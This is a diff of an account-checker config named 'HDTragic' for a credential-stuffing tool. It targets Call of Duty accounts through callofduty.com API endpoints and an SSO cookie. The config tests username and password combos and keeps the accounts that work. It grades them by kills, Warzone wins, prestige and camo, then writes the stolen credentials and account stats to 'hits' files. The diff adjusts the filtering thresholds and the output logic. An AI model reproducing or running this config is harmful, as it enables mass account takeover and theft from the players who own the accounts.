@@ -3,7 +3,7 @@
   "Name": "HDTragic",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2020-12-30T23:59:16.1883044-07:00",
+  "LastModified": "2020-12-31T01:24:07.4299819-07:00",
   "AdditionalInfo": "",
   "Author": "HDTragic",
   "Version": "1.4.1 [Anomaly]",
@@ -140,16 +140,16 @@ PARSE "<SOURCE>" JSON "ACT_SSO_COOKIE" -> VAR "4"
 
 #kd PARSE "<WZ>" JSON "kdRatio" CreateEmpty=FALSE -> CAP "WZ K/D" 
 
-#Stats_Checker KEYCHECK BanOnToCheck=FALSE 
-  KEYCHAIN Failure AND 
+#Kills_Checker KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" AND 
     KEY "<Kills>" LessThan "40000" 
     KEY "<WZ Wins>" LessThan "100" 
-    KEY "<Prestige>" LessThan "3" 
-  KEYCHAIN Failure OR 
-    KEY "<Kills>" DoesNotExist 
+    KEY "<Prestige>" LessThan "4" 
+  KEYCHAIN Custom "CUSTOM" OR 
     KEY "<WZ Wins>" DoesNotExist 
+    KEY "<WZ Wins>" EqualTo "" 
     KEY "<Kills>" EqualTo "" 
-    KEY "<Kills>" EqualTo "" 
+    KEY "<Kills>" DoesNotExist 
 
 #BattlePass REQUEST GET "https://www.callofduty.com/api/papi-client/loot/title/cw/platform/<2>/gamer/<3>/status/en" 
   
@@ -231,22 +231,7 @@ FUNCTION Constant "False" -> CAP "Obsidian"
 ENDIF
 IF "<Damascus>" Contains "True"
 
-UTILITY File "Hits/HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
-
-ENDIF
-IF "<Kills>" GreaterThan "3800"
-
-UTILITY File "Damascus_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
-
-ENDIF
-IF "<WZ Wins> GreaterThan "100"
-
-UTILITY File "WZWins_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
-
-ENDIF
-If "<Prestige>" GreaterThan "3"
-
-UTILITY File "Prestige3+_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
+UTILITY File "Hits\\HDTragic.txt" Write "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
 
 ENDIF
 
